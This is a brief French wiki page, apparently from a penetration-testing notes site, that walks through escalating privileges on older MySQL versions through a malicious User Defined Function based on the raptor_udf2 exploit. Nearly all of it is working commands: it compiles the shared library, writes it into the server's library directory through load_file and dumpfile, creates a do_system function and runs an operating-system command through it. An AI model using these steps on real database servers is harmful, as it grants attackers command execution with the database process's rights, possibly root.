---
title: MySQL
permalink: /MySQL/
---

# MySQL

Exploitation
------------

### User Defined functions

**Note**: cette partie est basée sur <https://www.exploit-db.com/exploits/1518/> et impacte les versions de MySQL &lt; 4.1.10a et MySQL &lt; 4.0.24

Dans un premier temps on compile la librairie dynamique utilisée:

``` bash
gcc -g -c raptor_udf2.c
gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Ensuite on crée la fonction MySQL qui l'utilisera. Ceci permet d'executer des commandes avec les droits de l'utilisateur qui contrôle le processus mysql (avec un peu de chance c'est root):

``` bash
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select * from mysql.func;
select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
```

